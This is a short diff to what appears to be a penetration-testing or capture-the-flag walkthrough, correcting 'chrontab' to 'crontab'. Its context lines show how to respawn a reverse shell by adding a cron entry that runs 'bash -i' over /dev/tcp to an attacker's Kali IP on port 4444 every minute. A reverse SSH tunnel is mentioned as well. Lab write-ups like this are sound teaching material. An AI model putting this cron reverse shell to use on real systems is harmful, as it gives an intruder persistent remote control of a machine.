@@ -114,7 +114,7 @@ use Portalord to establish a reverse ssh tunnel
 
 Respawn a reverse shell
 
-<div class="terminal"> chrontab -e </div>
+<div class="terminal"> crontab -e </div>
 at the bottom of the page add in your kali IP and pick a port (I put in 4444, but you can use any high port)
 
 <div class="terminal"> * * * * * bash -c 'bash -i &gt;& /dev/tcp/10.15.40.31/4444 0&gt;&1'</div>
